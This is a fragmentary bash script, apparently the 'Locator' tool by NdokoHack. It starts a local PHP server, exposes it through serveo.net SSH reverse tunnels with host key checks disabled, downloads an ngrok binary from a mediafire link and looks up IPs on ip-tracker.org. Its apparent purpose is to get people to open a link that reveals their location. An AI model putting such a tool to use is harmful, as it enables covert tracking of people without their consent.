#!/bin/bash
# Locator     
# Coded by: NdokoHack (You dont become a coder by just changing the credits)
# Github: https://github.com/NdokoHack/locator
...
IFS='\n'
iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (Linux; Android 9; RMX 1941) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" > iptracker.log)
IFS=$'\n'
...
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
printf "\n"
sleep 4 # &
...
wget http://download1103.mediafire.com/n3jafca8gh4g/kqxk18lau7lcuix/ngrok-stable-linux-arm.zip > /dev/null 2>&1
...
printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
php -t "server/" -S 127.0.0.1:4444 > /dev/null 2>&1 & 
sleep 2
...
printf "\e[1;77m |_______)\___/  \____)\_____|   \__)\___/ |_|         \e[0m\n"
printf "\n"
printf "\e[1;93m :::\e[0m\e[1;77m Coded by: @NdokoHack\e[0m\n"
